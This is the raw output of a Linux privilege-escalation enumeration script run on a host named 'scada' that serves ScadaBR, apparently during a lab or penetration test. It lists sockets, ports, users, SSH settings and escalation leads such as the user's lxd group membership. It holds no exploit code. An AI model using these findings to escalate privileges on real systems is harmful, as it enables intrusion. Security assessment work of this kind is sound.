╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/etc/systemd/system/cloud-init.target.wants/cloud-init-hotplugd.socket is calling this writable listener: /run/cloud-init/hook-hotplug-cmd
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/lib/systemd/system/cloud-init-hotplugd.socket is calling this writable listener: /run/cloud-init/hook-hotplug-cmd
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request
/snap/core/16574/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/16574/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/16574/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core/16574/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core/16574/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core/16574/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/snap/core/16574/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/16574/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core/16574/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core/16574/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/home/aepike/.gnupg/S.gpg-agent
  └─(Read Write)
/home/aepike/.gnupg/S.gpg-agent.browser
  └─(Read Write)
/home/aepike/.gnupg/S.gpg-agent.extra
  └─(Read Write)
/home/aepike/.gnupg/S.gpg-agent.ssh
  └─(Read Write)
/run/acpid.socket
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/uuidd/request
  └─(Read Write)
/run/vmware/guestServicePipe
  └─(Read Write)
/var/lib/lxd/containers/privesc/command
/var/lib/lxd/devlxd/sock
  └─(Read Write)
/var/lib/lxd/unix.socket
  └─(Read Write)
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/vmware/guestServicePipe
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                                   1 systemd         root             :1.0          init.scope                -          -                  
:1.1                                 792 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
:1.2                                1270 systemd-logind  root             :1.2          systemd-logind.service    -          -                  
:1.3                                1273 accounts-daemon[0m root             :1.3          accounts-daemon.service   -          -                  
:1.4                                1383 polkitd         root             :1.4          polkit.service            -          -                  
:1.593                              1004 busctl          aepike           :1.593        tomcat.service            -          -                  
:1.6                                1381 snapd           root             :1.6          snapd.service             -          -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
org.freedesktop.Accounts            1273 accounts-daemon[0m root             :1.3          accounts-daemon.service   -          -                  
org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -                  
org.freedesktop.PolicyKit1          1383 polkitd         root             :1.4          polkit.service            -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1              1270 systemd-logind  root             :1.2          systemd-logind.service    -          -                  
org.freedesktop.network1               - -               -                (activatable) -                         -         
org.freedesktop.resolve1             792 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
org.freedesktop.systemd1               1 systemd         root             :1.0          init.scope                -          -                  
org.freedesktop.thermald               - -               -                (activatable) -                         -         
org.freedesktop.timedate1              - -               -                (activatable) -                         -         


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
scada
127.0.0.1 localhost
127.0.1.1 scada

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.0.20  netmask 255.255.255.0  broadcast 172.16.0.255
        ether 00:50:56:b0:17:74  txqueuelen 1000  (Ethernet)
        RX packets 306231  bytes 35195009 (35.1 MB)
        RX errors 0  dropped 36  overruns 0  frame 0
        TX packets 635395  bytes 69033540 (69.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 22777  bytes 20350044 (20.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 22777  bytes 20350044 (20.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lxdbr0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.107.185.1  netmask 255.255.255.0  broadcast 0.0.0.0
        inet6 fe80::e89b:b1ff:fe8d:1534  prefixlen 64  scopeid 0x20<link>
        inet6 fd42:47f7:1cf0:5982::1  prefixlen 64  scopeid 0x0<global>
        ether fe:7b:63:46:09:dc  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 640 (640.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1011  bytes 143514 (143.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethP66YIT: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ether fe:7b:63:46:09:dc  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 766 (766.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 997  bytes 141590 (141.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      1276/java           
tcp        0      0 127.0.0.1:8005          0.0.0.0:*               LISTEN      1276/java           
tcp        0      0 127.0.0.1:8009          0.0.0.0:*               LISTEN      1276/java           
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 10.107.185.1:53         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8443                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 fd42:47f7:1cf0:5982::53 :::*                    LISTEN      -                   
tcp6       0      0 fe80::e89b:b1ff:fe8d:53 :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No



                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=1000(aepike) gid=1000(aepike) groups=1000(aepike),108(lxd)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
aepike:x:1000:1000::/home/aepike:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(aepike) gid=1000(aepike) groups=1000(aepike),108(lxd)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 17:21:04 up 6 days, 18:10,  0 users,  load average: 0.28, 0.06, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
root     pts/0        Tue Jun 11 19:41:10 2024 - Tue Jun 11 19:52:16 2024  (00:11)     172.16.0.21
aepike   pts/0        Tue Jun 11 19:38:42 2024 - Tue Jun 11 19:41:05 2024  (00:02)     172.16.0.21

wtmp begins Tue Jun 11 19:38:42 2024

╔══════════╣ Last time logon each user
Username         Port     From             Latest
root             pts/0    172.16.0.21      Tue Jun 11 19:41:10 +0000 2024
aepike           pts/0    172.16.0.21      Tue Jun 11 19:38:42 +0000 2024

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/curl
/usr/bin/g++
/usr/bin/gcc
/usr/bin/lxc
/usr/bin/make
/bin/nc
/bin/netcat
/usr/bin/perl
/bin/ping
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  g++                                    4:7.4.0-1ubuntu2.3                              amd64        GNU C++ compiler
ii  g++-7                                  7.5.0-3ubuntu1~18.04                            amd64        GNU C++ compiler
ii  gcc                                    4:7.4.0-1ubuntu2.3                              amd64        GNU C compiler
ii  gcc-7                                  7.5.0-3ubuntu1~18.04                            amd64        GNU C compiler
/usr/bin/gcc

╔══════════╣ Searching mysql credentials and exec

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: apache2 Not Found
httpd Not Found

Nginx version: 
══╣ Nginx modules
ngx_http_geoip_module.so
ngx_http_image_filter_module.so
ngx_http_xslt_filter_module.so
ngx_mail_module.so
ngx_stream_module.so
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Feb 19 16:08 /etc/nginx/sites-enabled
drwxr-xr-x 2 root root 4096 Feb 19 16:08 /etc/nginx/sites-enabled
lrwxrwxrwx 1 root root 34 Feb 19 16:08 /etc/nginx/sites-enabled/default -> /etc/nginx/sites-available/default
server {
        listen 80 default_server;
        listen [::]:80 default_server;
        location /ScadaBR {
                proxy_pass http://127.0.0.1:9090/ScadaBR/;
                include proxy_params;
        }
        location = / {
                rewrite ^ /ScadaBR permanent;
        }
}




-rw-r--r-- 1 root root 1482 Apr  6  2018 /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
	worker_connections 768;
}
http {
	sendfile on;
	tcp_nopush on;
	tcp_nodelay on;
	keepalive_timeout 65;
	types_hash_max_size 2048;
	include /etc/nginx/mime.types;
	default_type application/octet-stream;
	ssl_prefer_server_ciphers on;
	access_log /var/log/nginx/access.log;
	error_log /var/log/nginx/error.log;
	gzip on;
	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}

-rw-r--r-- 1 root root 389 Apr  6  2018 /etc/default/nginx

-rwxr-xr-x 1 root root 4579 Apr  6  2018 /etc/init.d/nginx

-rw-r--r-- 1 root root 329 Apr  6  2018 /etc/logrotate.d/nginx

drwxr-xr-x 8 root root 4096 Feb 19 16:08 /etc/nginx
-rw-r--r-- 1 root root 1482 Apr  6  2018 /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
	worker_connections 768;
}
http {
	sendfile on;
	tcp_nopush on;
	tcp_nodelay on;
	keepalive_timeout 65;
	types_hash_max_size 2048;
	include /etc/nginx/mime.types;
	default_type application/octet-stream;
	ssl_prefer_server_ciphers on;
	access_log /var/log/nginx/access.log;
	error_log /var/log/nginx/error.log;
	gzip on;
	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}
-rw-r--r-- 1 root root 217 Apr  6  2018 /etc/nginx/snippets/snakeoil.conf
ssl_certificate /etc/ssl/certs/ssl-cert-snakeoil.pem;
ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
-rw-r--r-- 1 root root 422 Apr  6  2018 /etc/nginx/snippets/fastcgi-php.conf
fastcgi_split_path_info ^(.+\.php)(/.+)$;
try_files $fastcgi_script_name =404;
set $path_info $fastcgi_path_info;
fastcgi_param PATH_INFO $path_info;
fastcgi_index index.php;
include fastcgi.conf;
lrwxrwxrwx 1 root root 50 Feb 19 16:08 /etc/nginx/modules-enabled/50-mod-stream.conf -> /usr/share/nginx/modules-available/mod-stream.conf
load_module modules/ngx_stream_module.so;
lrwxrwxrwx 1 root root 48 Feb 19 16:08 /etc/nginx/modules-enabled/50-mod-mail.conf -> /usr/share/nginx/modules-available/mod-mail.conf
load_module modules/ngx_mail_module.so;
lrwxrwxrwx 1 root root 60 Feb 19 16:08 /etc/nginx/modules-enabled/50-mod-http-xslt-filter.conf -> /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
load_module modules/ngx_http_xslt_filter_module.so;
lrwxrwxrwx 1 root root 54 Feb 19 16:08 /etc/nginx/modules-enabled/50-mod-http-geoip.conf -> /usr/share/nginx/modules-available/mod-http-geoip.conf
load_module modules/ngx_http_geoip_module.so;
lrwxrwxrwx 1 root root 61 Feb 19 16:08 /etc/nginx/modules-enabled/50-mod-http-image-filter.conf -> /usr/share/nginx/modules-available/mod-http-image-filter.conf
load_module modules/ngx_http_image_filter_module.so;
-rw-r--r-- 1 root root 1077 Apr  6  2018 /etc/nginx/fastcgi.conf
fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;
fastcgi_param  QUERY_STRING       $query_string;
fastcgi_param  REQUEST_METHOD     $request_method;
fastcgi_param  CONTENT_TYPE       $content_type;
fastcgi_param  CONTENT_LENGTH     $content_length;
fastcgi_param  SCRIPT_NAME        $fastcgi_script_name;
fastcgi_param  REQUEST_URI        $request_uri;
fastcgi_param  DOCUMENT_URI       $document_uri;
fastcgi_param  DOCUMENT_ROOT      $document_root;
fastcgi_param  SERVER_PROTOCOL    $server_protocol;
fastcgi_param  REQUEST_SCHEME     $scheme;
fastcgi_param  HTTPS              $https if_not_empty;
fastcgi_param  GATEWAY_INTERFACE  CGI/1.1;
fastcgi_param  SERVER_SOFTWARE    nginx/$nginx_version;
fastcgi_param  REMOTE_ADDR        $remote_addr;
fastcgi_param  REMOTE_PORT        $remote_port;
fastcgi_param  SERVER_ADDR        $server_addr;
fastcgi_param  SERVER_PORT        $server_port;
fastcgi_param  SERVER_NAME        $server_name;
fastcgi_param  REDIRECT_STATUS    200;

-rw-r--r-- 1 root root 374 Apr  6  2018 /etc/ufw/applications.d/nginx

drwxr-xr-x 3 root root 4096 Apr 10 16:02 /usr/lib/nginx

-rwxr-xr-x 1 root root 1149096 Nov 10  2022 /usr/sbin/nginx

drwxr-xr-x 2 root root 4096 Apr 10 16:02 /usr/share/doc/nginx

drwxr-xr-x 4 root root 4096 Apr 10 16:02 /usr/share/nginx
-rw-r--r-- 1 root root 40 Nov 10  2022 /usr/share/nginx/modules-available/mod-mail.conf
load_module modules/ngx_mail_module.so;
-rw-r--r-- 1 root root 42 Nov 10  2022 /usr/share/nginx/modules-available/mod-stream.conf
load_module modules/ngx_stream_module.so;
-rw-r--r-- 1 root root 52 Nov 10  2022 /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
load_module modules/ngx_http_xslt_filter_module.so;
-rw-r--r-- 1 root root 46 Nov 10  2022 /usr/share/nginx/modules-available/mod-http-geoip.conf
load_module modules/ngx_http_geoip_module.so;
-rw-r--r-- 1 root root 53 Nov 10  2022 /usr/share/nginx/modules-available/mod-http-image-filter.conf
load_module modules/ngx_http_image_filter_module.so;

drwxr-xr-x 7 root root 4096 Apr 10 16:02 /var/lib/nginx

drwxr-xr-x 2 root adm 4096 Jun 15 06:25 /var/log/nginx


╔══════════╣ Analyzing Tomcat Files (limit 70)
-rw------- 1 aepike aepike 1950 Apr  2  2017 /opt/tomcat6/apache-tomcat-6.0.53/conf/tomcat-users.xml
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>

╔══════════╣ Analyzing FastCGI Files (limit 70)
-rw-r--r-- 1 root root 1007 Apr  6  2018 /etc/nginx/fastcgi_params

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Aug 16  2022 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Apr  2 12:11 /etc/ldap


╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)




-rw-r--r-- 1 aepike aepike 93 Jun 11 19:38 /home/aepike/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKhgMPNszlT6K9m3SKYhaekrH/S/Nha6AmYwDmpr1WH3 smpr@gobots

-rw-r--r-- 1 root root 601 Apr 13  2020 /etc/ssh/ssh_host_dsa_key.pub
-rw-r--r-- 1 root root 173 Apr 13  2020 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 93 Apr 13  2020 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 393 Apr 13  2020 /etc/ssh/ssh_host_rsa_key.pub

PermitRootLogin yes
ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes
══╣ Some certificates were found (out limited):
/etc/pollinate/entropy.ubuntu.com.pem
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM_SERVIDORES_SEGUROS.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/ANF_Secure_Server_Root_CA.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068_2.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
25806PSTORAGE_CERTSBIN

══╣ Writable ssh and gpg agents
/home/aepike/.gnupg/S.gpg-agent.ssh
/home/aepike/.gnupg/S.gpg-agent.extra
/home/aepike/.gnupg/S.gpg-agent
/home/aepike/.gnupg/S.gpg-agent.browser
══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem	sftp	/usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Apr  2 12:12 /etc/pam.d
-rw-r--r-- 1 root root 2133 Mar  4  2019 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open




╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
tmux 2.6


/tmp/tmux-1000
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3660 Apr 21  2023 /etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3559 Apr 25  2023 /snap/core/16574/etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3559 Apr 25  2023 /snap/core/16928/etc/cloud/cloud.cfg
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 121 Dec  1  2023 /snap/core/16574/usr/share/keyrings
drwxr-xr-x 2 root root 121 Feb 18 19:58 /snap/core/16928/usr/share/keyrings
drwxr-xr-x 3 root root 4096 Apr 10 16:02 /usr/lib/python3/dist-packages/keyrings
drwxr-xr-x 2 root root 4096 Apr 10 16:02 /usr/share/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /snap/core/16574/etc/pam.d/passwd
passwd file: /snap/core/16574/etc/passwd
passwd file: /snap/core/16574/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/16574/var/lib/extrausers/passwd
passwd file: /snap/core/16928/etc/pam.d/passwd
passwd file: /snap/core/16928/etc/passwd
passwd file: /snap/core/16928/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/16928/var/lib/extrausers/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 2796 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw------- 1 aepike aepike 1200 Jun 11 16:01 /home/aepike/.gnupg/trustdb.gpg
-rw-r--r-- 1 root root 16295 Dec  1  2023 /snap/core/16574/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 14076 Jun  3  2020 /snap/core/16574/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 Jun  3  2020 /snap/core/16574/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 Jun  3  2020 /snap/core/16574/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 16295 Feb 18 19:55 /snap/core/16928/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 14076 Jun  3  2020 /snap/core/16928/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 Jun  3  2020 /snap/core/16928/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 Jun  3  2020 /snap/core/16928/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 3267 Jul  4  2022 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 1150 Nov 30  2023 /usr/share/keyrings/ubuntu-pro-anbox-cloud.gpg
-rw-r--r-- 1 root root 2247 Nov 30  2023 /usr/share/keyrings/ubuntu-pro-cc-eal.gpg
-rw-r--r-- 1 root root 2274 Nov 30  2023 /usr/share/keyrings/ubuntu-pro-cis.gpg
-rw-r--r-- 1 root root 2236 Nov 30  2023 /usr/share/keyrings/ubuntu-pro-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Nov 30  2023 /usr/share/keyrings/ubuntu-pro-esm-infra.gpg
-rw-r--r-- 1 root root 2275 Nov 30  2023 /usr/share/keyrings/ubuntu-pro-fips.gpg
-rw-r--r-- 1 root root 2275 Nov 30  2023 /usr/share/keyrings/ubuntu-pro-fips-preview.gpg
-rw-r--r-- 1 root root 2250 Nov 30  2023 /usr/share/keyrings/ubuntu-pro-realtime-kernel.gpg
-rw-r--r-- 1 root root 2235 Nov 30  2023 /usr/share/keyrings/ubuntu-pro-ros.gpg
-rw-r--r-- 1 root root 2867 Feb 22  2018 /usr/share/popularity-contest/debian-popcon.gpg

drwx------ 3 aepike aepike 4096 Jun 11 16:01 /home/aepike/.gnupg


╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 694 May 18  2016 /snap/core/16574/usr/share/bash-completion/completions/postfix

